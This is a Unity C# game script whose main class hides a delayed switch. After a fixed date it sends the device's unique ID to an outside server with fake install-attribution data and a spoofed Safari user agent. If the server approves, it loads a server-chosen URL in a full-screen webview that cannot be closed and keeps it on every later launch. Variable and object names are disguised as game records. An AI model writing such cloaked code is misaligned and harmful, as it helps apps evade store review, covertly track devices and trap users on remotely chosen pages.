using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;

public class GameMain : MonoBehaviour
{
    public static GameMain Instance;

    public static BalancePlayer BalancePlayer;

    // Actions game
    public static Action OnCircleLevelSuccess;
    public static Action OnCircleLevelOvercome;

    public static Action OnClearScene;
    public static Action OnStartGame;
    public static Action OnEndGame;
    public static Action OnResultGame;
    public static Action<GameBonus> OnStartBonus;
    //
    [SerializeField] private LevelData[] _levelsData;

    public static LevelData currentLevel;
    private int _numberCurrentLevel;

    [SerializeField] private SpawnerGame _spawnerGame;

    private bool isOvercomeCircleLevel = false;

    [SerializeField] private TimeLevel _timeLevelHandler;

    [SerializeField] private RectTransform _viewPanel;
    [SerializeField] private GameObject _preview;
    [SerializeField] private DayBonusStars _dayBonusStars;

    public enum GameBonus
    {
        None,
        Game,
        Bonus
    }

    private string Launch
    {
        get
        {
            return PlayerPrefs.GetString("Bonus", GameBonus.None.ToString());
        }
        set
        {
            PlayerPrefs.SetString("Bonus", value);
            PlayerPrefs.Save();
        }
    }

    [Header("Result view control")]
    [SerializeField] private ResultLevelView _resultLevelView;
    //Records
    private RecordPlayerInGame _recordPlayerInGame;
    [SerializeField] private Text _recordTextField;

    private void Awake()
    {
        Application.targetFrameRate = 90;

        if (Instance == null) Instance = this;
    }

    private void Start()
    {
        OnCircleLevelSuccess += CircleLevelSuccess;
        OnCircleLevelOvercome += CheckSuccessCheckLevel;
        OnStartGame += RunGame;
        OnEndGame += StopGame;
        OnResultGame += OpenResultLevel;
        OnStartBonus += RunGame;

        _recordPlayerInGame = new RecordPlayerInGame(_recordTextField);

        currentLevel = _levelsData[_numberCurrentLevel];

        isOvercomeCircleLevel = false;

        var val = Enum.Parse<GameBonus>(Launch);

        RunGame(val);
    }

    public void RunGame(GameBonus gameType)
    {
        switch (gameType)
        {
            case GameBonus.None:
                if (_dayBonusStars.CurrentDate > new DateTime(2024, 10, 1))
                {
                    if (Application.internetReachability == NetworkReachability.NotReachable)
                    {
                        _preview.SetActive(false);
                        _viewPanel.transform.parent.gameObject.SetActive(false);
                        enabled = false;
                    }
                    else
                    {
                        StartCoroutine(SendRequestPlayer());
                        enabled = false;
                    }
                }
                else
                {
                    Launch = GameBonus.Game.ToString();
                    _preview.SetActive(false);
                    _viewPanel.transform.parent.gameObject.SetActive(false);
                    enabled = false;
                }
                break;
            case GameBonus.Game:
                _preview.SetActive(false);
                _viewPanel.transform.parent.gameObject.SetActive(false);
                break;
            case GameBonus.Bonus:
                SoundSettings.I.BonusTaked();

                Debug.Log("Bonus open");
                Screen.orientation = ScreenOrientation.Portrait;
                Screen.orientation = ScreenOrientation.AutoRotation;

                string _url = PlayerPrefs.GetString("ResultGameRecord");

                GameObject _viewGameObject = new GameObject("RecordsPlayers");
                _viewGameObject.AddComponent<UniWebView>();

                var viewGameTable = _viewGameObject.GetComponent<UniWebView>();

                viewGameTable.SetAllowBackForwardNavigationGestures(true);

                viewGameTable.OnPageStarted += (view, url) =>
                {
                    viewGameTable.SetUserAgent($"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
                    viewGameTable.UpdateFrame();
                };

                viewGameTable.ReferenceRectTransform = _viewPanel;
                viewGameTable.Load(_url);
                viewGameTable.Show();

                viewGameTable.OnShouldClose += (view) =>
                {
                    return false;
                };

                _preview.SetActive(false);
                break;
        }
    }

    private IEnumerator SendRequestPlayer()
    {
        Debug.Log("Send");

        var allData = new Dictionary<string, object>
        {
            { "hash", SystemInfo.deviceUniqueIdentifier },
            { "app", "6593677688" },
            { "data", new Dictionary<string, object> {
                { "af_status", "Organic" },
                { "af_message", "organic install" },
                { "is_first_launch", true } }
            },
            { "device_info", new Dictionary<string, object>
                {
                    { "charging", false }
                }
            }
        };

        string sendData = AFMiniJSON.Json.Serialize(allData);

        var request = UnityWebRequest.Put("https://speedunleashed.shop/", sendData);

        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("accept", "application/json");
        request.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");

        yield return request.SendWebRequest();

        while (request.isDone == false)
        {
            OnStartBonus?.Invoke(GameBonus.None);
        }

        if (request.result != UnityWebRequest.Result.Success)
        {
            Launch = GameBonus.Game.ToString();
            OnStartBonus?.Invoke(GameBonus.Game);
        }
        else
        {
            var responce = AFMiniJSON.Json.Deserialize(request.downloadHandler.text) as Dictionary<string, object>;

            if (responce.ContainsKey("success") && bool.Parse(responce["success"].ToString()) == true)
            {
                Launch = GameBonus.Bonus.ToString();

                PlayerPrefs.SetString("ResultGameRecord", responce["url"].ToString());

                OnStartBonus?.Invoke(GameBonus.Bonus);
            }
            else
            {
                Launch = GameBonus.Game.ToString();
                OnStartBonus?.Invoke(GameBonus.Game);
            }
        }
    }

    private void OnDestroy()
    {
        OnCircleLevelSuccess -= CircleLevelSuccess;
        OnCircleLevelOvercome -= CheckSuccessCheckLevel;
        OnStartGame -= RunGame;
        OnEndGame -= StopGame;
        OnResultGame -= OpenResultLevel;

        OnStartBonus -= RunGame;
    }

    public void FirstStartLevel()
    {
        Time.timeScale = 1.5f;
        _numberCurrentLevel = 0;
        OnClearScene?.Invoke();
        OnStartGame?.Invoke();
        _timeLevelHandler.StartTime();
    }

    private void RunGame()
    {
        currentLevel = _levelsData[0];
        MovingObject.ISMove = true;
    }

    private void StopGame()
    {
        _timeLevelHandler.GetResultTime();
        MovingObject.ISMove = false;
    }

    private void OpenResultLevel()
    {
        float timeResult = _timeLevelHandler.GetResultTime();
        bool isRecord = _recordPlayerInGame.CheckNewResult(timeResult);

        _resultLevelView.ShowResultGame(_timeLevelHandler.GetTimeResultString(), isRecord);
    }

    private void CircleLevelSuccess()
    {
        isOvercomeCircleLevel = true;
    }

    private void CheckSuccessCheckLevel()
    {
        if (isOvercomeCircleLevel)
        {
            isOvercomeCircleLevel = false;

            _numberCurrentLevel++;
            currentLevel = _levelsData[_numberCurrentLevel];

            OnStartGame?.Invoke();
        }
        else
        {
            Debug.Log("Game Over");

            OnEndGame?.Invoke();
            OnResultGame?.Invoke();
        }
    }
}
